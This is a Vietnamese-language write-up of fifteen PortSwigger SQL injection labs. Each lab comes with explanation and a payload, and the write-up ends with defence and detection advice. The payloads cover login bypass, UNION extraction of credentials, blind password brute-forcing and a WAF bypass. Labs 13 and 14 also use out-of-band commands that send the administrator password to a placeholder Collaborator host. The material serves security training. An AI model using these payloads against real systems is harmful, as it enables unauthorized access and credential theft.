---
id: sqli-labs
title: SQL Injection — 15 Labs PortSwigger
sidebar_label: SQLi (Week 10)
sidebar_position: 2
description: Writeup 15 lab SQL Injection trên PortSwigger Web Security Academy — từ UNION attack cơ bản đến Blind SQLi với OOB data exfiltration. OWASP A03 Injection.
---

# SQL Injection — 15 Labs PortSwigger

## 1. Tổng quan lý thuyết SQL Injection

SQL Injection (SQLi) là một trong những lớp lỗ hổng lâu đời nhất nhưng vẫn liên tục xuất hiện trong danh sách **OWASP Top 10** (A03:2021 — Injection). Bản chất của lỗ hổng nằm ở chỗ ứng dụng nhúng trực tiếp dữ liệu đầu vào từ người dùng vào câu truy vấn SQL mà không thực hiện bất kỳ bước tách biệt nào giữa code và data. Khi đó, attacker có thể khéo léo chèn thêm cú pháp SQL vào input, thao túng logic truy vấn theo hướng có lợi cho mình — từ việc trích xuất dữ liệu nhạy cảm từ các bảng khác, bypass xác thực, leo thang đặc quyền, cho đến trong một số trường hợp đặc biệt có thể thực thi lệnh hệ điều hành thông qua các stored procedure nguy hiểm như `xp_cmdshell` của MSSQL.

Về phân loại, SQLi được chia thành ba nhóm chính dựa trên cách dữ liệu khai thác được trả về cho attacker. **In-band SQLi** là trường hợp output của truy vấn được phản chiếu trực tiếp trên response HTTP, bao gồm hai kỹ thuật con: UNION-based (ghép kết quả từ bảng khác vào response) và Error-based (ép database trả ra thông báo lỗi chứa dữ liệu cần lấy). **Blind SQLi** là trường hợp ứng dụng không hiển thị output của query nhưng attacker vẫn có thể suy luận thông qua sự thay đổi hành vi: Boolean-based (trang render khác nhau tùy điều kiện TRUE/FALSE) và Time-based (đo độ trễ response khi inject hàm sleep). Cuối cùng là **Out-of-band (OOB) SQLi** — kỹ thuật tinh vi nhất khi cả output lẫn timing đều không phân biệt được, attacker buộc database tự chủ động gửi dữ liệu ra ngoài qua kênh DNS hoặc HTTP tới một server do attacker kiểm soát.

Một khía cạnh quan trọng khác là **Injection Context** — vị trí mà payload được chèn vào ảnh hưởng trực tiếp đến cú pháp payload cần dùng. Injection trong mệnh đề `WHERE` là phổ biến nhất, nhưng payload trong `ORDER BY` không thể dùng UNION, injection trong `INSERT`/`UPDATE` có cú pháp riêng, và đặc biệt nguy hiểm là **second-order injection** — input được lưu vào database ở dạng an toàn rồi sau đó được đọc ra và nhúng vào query khác mà không qua sanitization, khiến các scanner tự động thường bỏ sót.

Về biện pháp phòng thủ, **parameterized queries** (hay prepared statements) là tiêu chuẩn vàng — tách biệt hoàn toàn code và data ở tầng driver, khiến mọi input của người dùng đều được xử lý như một giá trị thuần túy thay vì được parse như cú pháp SQL. WAF là lớp bổ sung hữu ích nhưng không thể thay thế parameterized queries vì WAF có thể bị bypass bằng encoding, obfuscation, hoặc các cú pháp đặc thù của từng database engine. Ngoài ra, nguyên tắc **Principle of Least Privilege** cho database account cũng rất quan trọng — service account của ứng dụng chỉ nên có quyền `SELECT`/`INSERT`/`UPDATE` trên các bảng cần thiết, tuyệt đối không chạy với quyền `DBA` hay `sa`.

---

## 2. Writeup 15 Labs

### Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> **Mục tiêu:** Khai thác SQLi trong tham số `category` để hiển thị tất cả sản phẩm kể cả những sản phẩm chưa được phát hành (`released=0`).

**Logic suy luận:** Ứng dụng xây dựng câu truy vấn dạng `SELECT * FROM products WHERE category='[input]' AND released=1`, trong đó `[input]` được lấy thẳng từ query parameter mà không qua parameterized query. Khi chèn `' OR 1=1--`, ký tự `'` đóng chuỗi string trong SQL, `OR 1=1` thêm điều kiện luôn đúng, và `--` comment out phần còn lại của câu truy vấn bao gồm cả điều kiện `AND released=1`. Kết quả là toàn bộ sản phẩm trong bảng được trả về, không phân biệt trạng thái released.

**Payload mẫu:**
```
GET /filter?category=Gifts'+OR+1=1-- HTTP/1.1
```

---

### Lab 2: SQL injection vulnerability allowing login bypass

> **Mục tiêu:** Đăng nhập vào tài khoản `administrator` mà không cần biết mật khẩu.

**Logic suy luận:** Form đăng nhập tạo câu truy vấn `SELECT * FROM users WHERE username='[username]' AND password='[password]'`. Khi nhập `administrator'--` vào trường username, dấu `'` đóng string sau `administrator`, và `--` comment out toàn bộ phần còn lại của query bao gồm cả điều kiện kiểm tra password. Câu truy vấn hiệu quả trở thành `SELECT * FROM users WHERE username='administrator'`, và nếu tồn tại user administrator thì đăng nhập thành công bất kể mật khẩu nhập vào là gì.

**Payload mẫu:**
```
username=administrator'--&password=anything
```

---

### Lab 3: SQL injection UNION attack, determining the number of columns returned by the query

> **Mục tiêu:** Xác định số lượng cột được trả về bởi câu truy vấn gốc thông qua UNION attack.

**Logic suy luận:** Để thực hiện UNION attack thành công, số cột trong câu SELECT phụ phải khớp chính xác với số cột của câu SELECT gốc. Có hai cách enumerate: dùng `ORDER BY N--` tăng dần N cho đến khi ứng dụng trả về lỗi (tức N vượt quá số cột thực tế), hoặc dùng `UNION SELECT NULL,NULL,...--` tăng dần số NULL. NULL được chọn vì nó tương thích với mọi kiểu dữ liệu, tránh lỗi type mismatch. Lab này có 3 cột nên payload cuối cùng là 3 NULL.

**Payload mẫu:**
```sql
' ORDER BY 1--   -- OK
' ORDER BY 2--   -- OK
' ORDER BY 3--   -- OK
' ORDER BY 4--   -- Error → có 3 cột

' UNION SELECT NULL,NULL,NULL--   -- Xác nhận 3 cột
```

---

### Lab 4: SQL injection UNION attack, finding a column containing text

> **Mục tiêu:** Xác định cột nào trong 3 cột trả về có kiểu dữ liệu text để có thể exfiltrate string.

**Logic suy luận:** Sau khi đã biết có 3 cột, bước tiếp theo là tìm cột nào có thể chứa dữ liệu kiểu string. Nếu một cột có kiểu số nguyên (integer), việc nhúng string vào đó sẽ gây lỗi type mismatch. Attacker thay lần lượt từng NULL bằng một string literal theo yêu cầu của lab để tìm ra cột phù hợp. Kỹ thuật này là bước đệm cần thiết trước khi exfiltrate dữ liệu thực sự từ các bảng khác.

**Payload mẫu:**
```sql
' UNION SELECT 'test',NULL,NULL--    -- Nếu không lỗi → cột 1 là text
' UNION SELECT NULL,'test',NULL--    -- Nếu không lỗi → cột 2 là text
' UNION SELECT NULL,NULL,'test'--    -- Nếu không lỗi → cột 3 là text
```

---

### Lab 5: SQL injection UNION attack, retrieving data from other tables

> **Mục tiêu:** Dùng UNION attack để lấy username và password của tất cả user từ bảng `users`.

**Logic suy luận:** Đây là bước khai thác thực sự sau khi đã hoàn thành enumeration ở Lab 3 và 4. Attacker dùng thông tin về cấu trúc database (tên bảng `users`, tên cột `username` và `password` — thường được hint bởi lab hoặc tìm qua `information_schema`) để viết câu UNION SELECT trích xuất trực tiếp credentials. Kết quả được hiển thị ngay trên response cùng với dữ liệu gốc của ứng dụng.

**Payload mẫu:**
```sql
' UNION SELECT username,password FROM users--
```

---

### Lab 6: SQL injection UNION attack, retrieving multiple values in a single column

> **Mục tiêu:** Exfiltrate cả username lẫn password khi chỉ có duy nhất một cột kiểu text trong kết quả trả về.

**Logic suy luận:** Khi chỉ có một cột text khả dụng, không thể đồng thời đưa hai giá trị vào hai cột riêng biệt. Giải pháp là **string concatenation** — ghép hai giá trị thành một chuỗi với ký tự phân tách để dễ tách ra sau. Cú pháp concatenation khác nhau tùy database engine: PostgreSQL dùng `||`, MySQL dùng `CONCAT()` hoặc khoảng trắng, Oracle dùng `||`. Kỹ thuật này là nền tảng của mọi kịch bản exfiltration qua kênh hạn chế.

**Payload mẫu:**
```sql
-- PostgreSQL
' UNION SELECT username||':'||password FROM users--

-- MySQL
' UNION SELECT CONCAT(username,':',password) FROM users--
```

---

### Lab 7: SQL injection attack, querying the database type and version on MySQL and Microsoft

> **Mục tiêu:** Xác định phiên bản database đang chạy trên server.

**Logic suy luận:** Thông tin về database version là bước đầu tiên trong giai đoạn reconnaissance của SQLi attack. Mỗi database engine có hàm/biến version riêng, và việc xác định đúng engine là điều kiện tiên quyết để dùng đúng payload cho các bước tiếp theo. Lab này chạy MySQL hoặc MSSQL — cả hai đều hỗ trợ biến `@@version`. Sự khác biệt về cú pháp comment cũng quan trọng: MySQL hỗ trợ `--` nhưng yêu cầu khoảng trắng sau (`-- `), trong khi MSSQL dùng `--` hoặc `/**/`.

**Payload mẫu:**
```sql
-- MySQL / MSSQL
' UNION SELECT @@version,NULL--

-- PostgreSQL
' UNION SELECT version(),NULL--

-- Oracle (bắt buộc có FROM)
' UNION SELECT * FROM v$version--
```

---

### Lab 8: SQL injection attack, listing the database contents on non-Oracle databases

> **Mục tiêu:** Enumerate toàn bộ cấu trúc database (tables, columns) và trích xuất credentials từ bảng users có tên bị random hóa.

**Logic suy luận:** Trên các database không phải Oracle (MySQL, PostgreSQL, MSSQL), `information_schema` là metadata catalog chuẩn chứa thông tin về tất cả bảng và cột. Attacker truy vấn `information_schema.tables` để tìm tên bảng users (thường bị random hóa thành dạng `users_abcde` để tránh hardcode), sau đó truy vấn `information_schema.columns` với điều kiện `table_name` để tìm tên cột username và password, và cuối cùng SELECT trực tiếp từ bảng đó. Đây là workflow chuẩn của mọi UNION-based SQLi enumeration.

**Payload mẫu:**
```sql
-- Bước 1: List tất cả tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Bước 2: List columns của bảng tìm được (ví dụ users_abcde)
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcde'--

-- Bước 3: Exfiltrate data
' UNION SELECT username_col,password_col FROM users_abcde--
```

---

### Lab 9: Blind SQL injection with conditional responses

> **Mục tiêu:** Khai thác Blind SQLi trong `TrackingId` cookie — không có output trực tiếp — để brute-force từng ký tự của password administrator dựa trên sự hiển thị/ẩn của chuỗi "Welcome back!".

**Logic suy luận:** Đây là lab đầu tiên thuộc dạng Blind SQLi — ứng dụng không hiển thị kết quả truy vấn ra response, nhưng lại có hành vi khác nhau tùy điều kiện. Khi điều kiện inject là TRUE, trang hiển thị "Welcome back!"; khi FALSE thì không. Attacker khai thác binary oracle này để brute-force từng ký tự password bằng cách dùng hàm `SUBSTRING()` để cô lập một ký tự tại một thời điểm, rồi so sánh với từng ký tự trong bảng chữ cái. Với Burp Intruder (Cluster Bomb mode), toàn bộ quá trình có thể được tự động hóa.

**Payload mẫu:**
```sql
-- Kiểm tra ký tự đầu tiên của password
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

-- Dùng Burp Intruder Cluster Bomb:
-- Position 1: vị trí ký tự (1..20)
-- Position 2: ký tự thử (a..z, 0..9)
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--
```

---

### Lab 10: Blind SQL injection with conditional errors

> **Mục tiêu:** Khai thác Blind SQLi khi ứng dụng không có bất kỳ conditional response nào, chỉ phân biệt được qua HTTP status code (200 vs 500).

**Logic suy luận:** Khi không có "Welcome back!" hay bất kỳ sự khác biệt nào trong nội dung response, attacker chuyển sang dùng **error oracle**. Kỹ thuật CASE-WHEN được dùng để điều khiển có/không xảy ra lỗi dựa trên điều kiện: nếu điều kiện TRUE thì thực hiện phép chia cho 0 (gây lỗi 500), nếu FALSE thì trả về giá trị hợp lệ (response 200). Trên Oracle database, `TO_CHAR(1/0)` kích hoạt lỗi ORA-01476; trên MSSQL có thể dùng `CONVERT(int, 'a')`. Đây là kỹ thuật quan trọng trong các môi trường mà WAF hoặc custom error page đã ẩn đi toàn bộ thông báo lỗi của DB.

**Payload mẫu:**
```sql
-- Oracle
TrackingId=xyz'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'--

-- Nếu điều kiện TRUE  → 1/0 → HTTP 500
-- Nếu điều kiện FALSE → ''  → HTTP 200
```

---

### Lab 11: Visible error-based SQL injection

> **Mục tiêu:** Khai thác thông báo lỗi database được hiển thị nguyên văn trên response để trích xuất dữ liệu trong một bước duy nhất.

**Logic suy luận:** Một số ứng dụng cấu hình sai khi để lộ thông báo lỗi chi tiết từ database ra giao diện người dùng. Attacker tận dụng điều này bằng cách cố tình gây ra lỗi type casting — ép một giá trị string thành integer — khiến database engine tạo ra thông báo lỗi chứa chính giá trị string đó. Ví dụ, `CAST((SELECT password FROM users LIMIT 1) AS int)` sẽ thất bại với thông báo kiểu `invalid input syntax for integer: "secretpassword"` — lộ trực tiếp password trong error message. Đây là kỹ thuật nhanh nhất để exfiltrate data khi ứng dụng verbose về lỗi.

**Payload mẫu:**
```sql
-- PostgreSQL / MSSQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- Kết quả: ERROR: invalid input syntax for type integer: "actualpassword123"
```

---

### Lab 12: Blind SQL injection with time delays and information retrieval

> **Mục tiêu:** Khai thác Blind SQLi thông qua timing oracle — đo thời gian response để suy luận TRUE/FALSE và brute-force password.

**Logic suy luận:** Khi không có conditional response lẫn error response có thể khai thác, kênh cuối cùng trong band là **time delay**. Attacker inject hàm sleep/delay có điều kiện: nếu điều kiện TRUE thì gọi hàm delay (ví dụ `pg_sleep(10)` trên PostgreSQL), nếu FALSE thì không delay. Bằng cách đo thời gian response — response trên 10 giây đồng nghĩa với điều kiện TRUE — attacker có thể xây dựng binary oracle tương tự Lab 9 nhưng hoàn toàn dựa trên timing. Kỹ thuật này chậm hơn đáng kể và dễ bị ảnh hưởng bởi network jitter, nhưng là phương án khả thi khi tất cả kênh khác đã bị chặn.

**Payload mẫu:**
```sql
-- PostgreSQL
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--

-- MSSQL
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:10'--
```

---

### Lab 13: Blind SQL injection with out-of-band interaction

> **Mục tiêu:** Xác nhận khả năng thực hiện OOB interaction bằng cách buộc database gửi DNS query tới Burp Collaborator.

**Logic suy luận:** Trong một số môi trường, ứng dụng chạy trên database server có kết nối ra ngoài internet, nhưng response của ứng dụng hoàn toàn không phản ánh bất kỳ sự khác biệt nào dù inject payload hay không. Kỹ thuật OOB tận dụng khả năng của database engine trong việc thực hiện network call: MSSQL có `xp_dirtree` cho phép tạo UNC path request (thực chất là DNS/SMB lookup), Oracle có `UTL_HTTP.request()` và `UTL_INADDR.get_host_address()`. Burp Collaborator là dịch vụ nhận và log các interaction này, giúp attacker xác nhận sự tồn tại của lỗ hổng.

**Payload mẫu:**
```sql
-- MSSQL
'; exec master..xp_dirtree '//YOUR-COLLABORATOR-ID.oastify.com/a'--

-- Oracle
' UNION SELECT UTL_HTTP.request('http://YOUR-COLLABORATOR-ID.oastify.com') FROM dual--
```

---

### Lab 14: Blind SQL injection with out-of-band data exfiltration

> **Mục tiêu:** Nâng cấp kỹ thuật OOB: nhúng kết quả truy vấn vào subdomain của DNS request để exfiltrate password administrator.

**Logic suy luận:** Sau khi xác nhận OOB interaction hoạt động ở Lab 13, bước tiếp theo là nhúng dữ liệu vào chính DNS query đó. Attacker xây dựng payload động: lấy giá trị password từ database, sau đó ghép nó thành subdomain trong URL gửi tới Collaborator. Collaborator nhận được DNS lookup với subdomain là chính giá trị password cần tìm — hoàn toàn bypassing mọi output restriction của ứng dụng. Đây là kỹ thuật phức tạp nhất trong SQLi nhưng cực kỳ hữu hiệu trong môi trường zero-output.

**Payload mẫu:**
```sql
-- MSSQL
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='administrator');
exec('master..xp_dirtree "//'+@p+'.YOUR-COLLABORATOR-ID.oastify.com/a"')--

-- Oracle
' UNION SELECT UTL_HTTP.request('http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR-ID.oastify.com') FROM dual--

-- Collaborator nhận được: secretpassword123.YOUR-COLLABORATOR-ID.oastify.com
```

---

### Lab 15: SQL injection with filter bypass via XML encoding

> **Mục tiêu:** Bypass WAF đang chặn các keyword SQLi phổ biến (`UNION`, `SELECT`...) bằng cách encode payload dưới dạng XML entities.

**Logic suy luận:** Ứng dụng này nhận input qua XML body và có WAF phía trước chặn các pattern SQLi thông thường. Điểm mấu chốt là **thứ tự xử lý**: backend XML parser giải mã XML entities (`&#x55;` → `U`) *trước khi* dữ liệu được đưa vào câu SQL, nhưng WAF kiểm tra raw request và không giải mã entities. Do đó, WAF nhìn vào `&#x55;NION` không nhận ra đây là `UNION`, trong khi database nhận được chuỗi đã giải mã hoàn chỉnh. Đây là dạng tấn công **protocol-layer confusion** — khai thác sự bất đồng bộ trong cách các lớp xử lý parse dữ liệu.

**Payload mẫu:**
```xml
<!-- Trong XML body -->
<storeId>
    1 &#x55;NION &#x53;ELECT NULL,NULL--
</storeId>

<!-- Giải mã: 1 UNION SELECT NULL,NULL-- -->
<!-- WAF thấy: 1 &#x55;NION &#x53;ELECT NULL,NULL-- → không match rule -->
```

---

## 3. Kỹ năng và bài học rút ra

### Góc nhìn Red Team

Điều khiến SQL Injection vẫn nguy hiểm trong modern application không đơn thuần là "developer quên dùng prepared statement" — mà còn đến từ những trường hợp tinh vi hơn nhiều. **Second-order injection** là ví dụ điển hình: input được sanitize đúng cách khi lưu vào database, nhưng sau đó được đọc ra và nhúng vào một câu query khác mà không qua validation — scanner tự động hầu như không phát hiện được vì cần hiểu luồng dữ liệu qua nhiều bước. **ORM injection** là một nguồn lỗi khác thường bị bỏ qua: developers tin tưởng hoàn toàn vào ORM framework nhưng vẫn dùng raw query thông qua các method như `.extra()`, `.RawSQL()`, hoặc dynamic ordering. **GraphQL injection** ngày càng phổ biến khi ứng dụng hiện đại chuyển sang GraphQL — các argument của query có thể là điểm injection nếu resolver không được viết an toàn. Ngoài ra, **WAF bypass** không chỉ giới hạn ở XML encoding — attacker có thể dùng comment inline (`UN/**/ION`), case variation (`uNiOn`), URL double-encoding, hay các hàm tương đương ít phổ biến hơn trong từng database engine để vượt qua signature-based detection.

### Góc nhìn Blue Team / SOC

Từ phía phòng thủ, tầng phát hiện cần được xây dựng ở nhiều lớp. Ở tầng WAF, việc chỉ block các keyword như `UNION` hay `SELECT` là không đủ — cần bổ sung rule cho các dạng encoding và obfuscation, đồng thời thường xuyên review false positive để tránh tình trạng rule quá lỏng vì áp lực operational. Ở tầng database, cần bật **query logging** và xây dựng alert cho các pattern bất thường: số lượng query tăng đột biến từ một session, xuất hiện các từ khóa như `information_schema`, `UNION SELECT`, hay `pg_sleep` trong query log, hoặc một account thực hiện query sang các bảng nhạy cảm mà bình thường không truy cập. Trong Splunk, một SPL đơn giản có thể bắt đầu với `index=web_logs | search uri_query="*UNION*" OR uri_query="*SELECT*" OR uri_query="*OR+1=1*"` rồi kết hợp với thống kê theo source IP để phát hiện scanning. Quan trọng không kém, **Principle of Least Privilege** cho database account của ứng dụng là hàng rào cuối: ngay cả khi SQLi thành công, nếu account đó không có quyền đọc bảng `users` hay không có quyền thực thi stored procedure, tác hại sẽ bị giới hạn đáng kể. Việc kết hợp WAF, logging, alerting và privilege control tạo nên mô hình **defense-in-depth** thực sự hiệu quả trước các cuộc tấn công SQLi trong môi trường production.
